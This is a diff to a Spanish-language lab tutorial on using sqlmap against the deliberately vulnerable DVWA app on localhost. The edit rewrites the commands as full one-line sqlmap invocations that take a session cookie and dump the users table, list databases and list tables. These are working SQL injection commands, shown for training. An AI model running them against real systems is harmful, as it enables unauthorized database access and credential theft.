@@ -23,9 +23,7 @@ sqlmap necesita entrar a DVWA como si fuera el usuario, así que se le entrega l
 Se ejecuta este comando en la terminal, reemplazando `TU_COOKIE` por el valor de PHPSESSID:
 
 ```bash
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="PHPSESSID=TU_COOKIE; security=low" \
-  --batch --dump -D dvwa -T users
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_COOKIE; security=low" --batch --dump -D dvwa -T users
 ```
 
 ¿Qué hace cada parte?
@@ -50,10 +48,16 @@ sqlmap confirma la vulnerabilidad, descarga la tabla completa y, al final, pregu
 
 ## Comandos extra (opcionales)
 
-```bash
-# Ver todas las bases de datos
-sqlmap -u "..." --cookie="..." --batch --dbs
+Ver todas las bases de datos:
 
-# Ver las tablas de la base dvwa
-sqlmap -u "..." --cookie="..." --batch -D dvwa --tables
+```bash
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_COOKIE; security=low" --batch --dbs
 ```
+
+Ver las tablas de la base dvwa:
+
+```bash
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_COOKIE; security=low" --batch -D dvwa --tables
+```
+
+> En todos los comandos, `TU_COOKIE` se reemplaza por el valor real de `PHPSESSID` (F12 → Storage → Cookies → localhost). El `PHPSESSID=` del inicio siempre debe ir.
